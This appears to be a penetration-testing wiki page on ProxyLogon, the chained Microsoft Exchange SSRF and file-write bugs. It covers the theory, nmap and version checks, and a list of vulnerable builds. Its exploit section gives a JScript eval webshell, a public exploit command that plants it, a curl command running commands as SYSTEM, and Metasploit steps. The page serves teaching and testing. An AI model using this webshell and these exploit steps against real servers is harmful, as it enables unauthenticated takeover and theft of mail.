---
description: Chained CVE-2021-26855 and CVE-2021-27065
---

# ProxyLogon

## Theory

ProxyLogon is the formally generic name for [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855), a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the admin. We have also chained this bug with another post-auth arbitrary-file-write vulnerability, [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065), to get code execution. All affected components are **vulnerable by default**!\
As a result, an **unauthenticated** attacker can **execute arbitrary commands** on Microsoft Exchange Server through an **only opened 443 port**!

**CVE-2021-26855** : Pre-auth SSRF\
This is a Server-Side Request Forgery (SSRF) vulnerability in the Exchange Server that allows remote attackers to gain admin access once exploited. This can be exploited by sending a specially crafted web request to a vulnerable Exchange Server. The web request contains an XML SOAP payload directed at the Exchange Web Services (EWS) API endpoint. This request bypasses authentication using **specially crafted cookies**. This vulnerability, combined with the knowledge of a victim’s email address, means the attacker can exfiltrate all emails from the target’s Exchange mailbox.

**CVE-2021-27065** : Post-auth Arbitrary-File-Write\
Thanks to the super SSRF allowing us to access the Backend without restriction. The next is to find a RCE bug to chain together. Here we leverage a Backend internal API `/proxyLogon.ecp` to become the admin. The API is also the reason why we called it ProxyLogon.\
Because we leverage the Frontend handler of static resources to access the ECExchange Control Panel (ECP) Backend, the header `msExchLogonMailbox` , which is a special HTTP header in the ECP Backend, will not be blocked by the Frontend. By leveraging this minor inconsistency, we can specify ourselves as the SYSTEM user and generate a valid ECP session with the internal API.

## Practice

{% tabs %}
{% tab title="Enumerate" %}
We can use the [http-vuln-exchange.nse](https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange.nse) nmap script to scan a target

```bash
nmap -p80,443 --script="http-vuln-exchange.nse" $IP

443/tcp open  https
    |_http-vuln-proxylogon: (15.1.2176) Exchange 2016 potentially vulnerable, check latest security update is applied (Exchange 2016 CU18 or CU19 installed)
```

If we have local access to the target running exchange, we can check it version using the following powershell command:

```powershell
#Method 1
PS> GCM exsetup |%{$_.Fileversioninfo}

#Method 2
PS> (Get-Command ExSetup.exe).FileVersionInfo.ProductVersion

ProductVersion   FileVersion      FileName                                                                             
--------------   -----------      --------                                                                             
15.02.0858.005   15.02.0858.005   C:\Program Files\Microsoft\Exchange Server\V15\bin\ExSetup.exe
```

We can now search for the exact Microsoft Exchange product version using [this microsoft link](https://learn.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019).\
\
Following versions are vulnerable:

| Version            | Vulnerable ProductVersion |
| ------------------ | ------------------------- |
| Exchange 2013      | < 15.00.1497.012          |
| Exchange 2016 CU18 | < 15.01.2106.013          |
| Exchange 2016 CU19 | < 15.01.2176.009          |
| Exchange 2019 CU7  | < 15.02.0721.013          |
| Exchange 2019 CU8  | < 15.02.0792.010          |

{% hint style="info" %}
All versions before March 2, 2021 are vulnerable
{% endhint %}
{% endtab %}

{% tab title="Exploit" %}
We can use this [python exploit](https://github.com/praetorian-inc/proxylogon-exploit) to abuse ProxyLogon. First let's create a webshell.

{% code title="webshell.aspx" %}
```aspnet
<script language="JScript" runat="server">
function Page_Load(){
eval(Request["kxpprfgvnosz"],"unsafe");
}
</script>
```
{% endcode %}

Run the exploit

```bash
python exploit.py --frontend https://172.16.59.7 --backend exchange.hafnium.local \
  --email administrator@hafnium.local \
  --webshell webshell.aspx \
  --path 'C:\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\ecp\\auth\\o.aspx'
```

{% hint style="info" %}
Exploitation requires knowledge of the frontend Exchange server URL (e.g. `https://exchange.example.org`) and an email address for a user on the system. The admin SID and backend can be leaked from the server.
{% endhint %}

We can now access our webshell:

```bash
$ curl -s -k https://172.16.59.7/ecp/auth/o.aspx \
  -d 'kxpprfgvnosz=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll());' | head -n 1

nt authority\system
```
{% endtab %}

{% tab title="Exploit - Metasploit" %}
A Metasploit module is available to exploit ProxyLogon

```bash
msf > use exploit/windows/http/exchange_proxylogon_rce
msf exploit(exchange_proxylogon_rce) > show targets
    ...targets...
msf exploit(exchange_proxylogon_rce) > set TARGET < target-id >
msf exploit(exchange_proxylogon_rce) > show options
    ...show and set options...
msf exploit(exchange_proxylogon_rce) > exploit
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://proxylogon.com/" %}

{% embed url="https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html" %}
